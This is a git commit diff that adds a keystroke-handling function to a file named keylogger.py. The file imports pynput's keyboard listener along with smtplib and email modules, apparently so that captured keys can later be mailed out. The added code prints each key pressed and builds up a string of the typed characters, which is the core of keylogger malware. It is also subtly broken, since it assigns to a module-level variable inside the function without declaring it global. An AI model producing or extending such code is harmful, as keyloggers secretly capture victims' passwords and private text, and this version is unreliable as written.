6a399316f11506b07a0299822c55dfdec14bee86
Kieran Pritchard <KieranPritchard06@gmail.com>
2025-08-25 20:21:08 +0100

    made on_press function

--- keylogger.py
+++ keylogger.py
@@ -2,3 +2,12 @@ import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
+
+keys_pressed = ""
+
+def on_press(key):
+    try:
+        print(f"Key {key.char} pressed")
+        keys_pressed = keys_pressed + key.char
+    except AttributeError:
+        print(f"Special key {key} pressed")
